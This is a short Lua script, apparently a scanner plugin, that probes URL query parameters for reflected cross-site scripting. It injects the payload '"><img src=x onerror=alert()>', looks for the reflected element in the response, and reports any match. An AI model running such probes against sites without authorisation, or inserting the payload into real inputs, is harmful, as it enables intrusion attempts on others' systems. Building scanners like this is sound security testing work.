REPORT = {}
VALID = false


PAYLOAD = '"><img src=x onerror=alert()>'

function payloads_gen(url)
    new_querys = change_urlquery(url,PAYLOAD)
    return new_querys
end


function main(param,new_url)
    local resp = send_req(new_url)
    local body = resp.body:GetStrOrNil()
    if body == "" then
        return
    end
    local css_pattern = generate_css_selector(PAYLOAD)
    if string.len(css_pattern) > 0 then
        local searcher = html_search(body,css_pattern)
        if string.len(searcher) > 0 then
            println(string.format("RXSS: %s | %s | %s ",resp.url:GetStrOrNil(),PAYLOAD,css_pattern))
            REPORT["url"] = new_url
            REPORT["match"] = css_pattern
            REPORT["payload"] = PAYLOAD
            VALID = true
        end
    end
    return REPORT
end
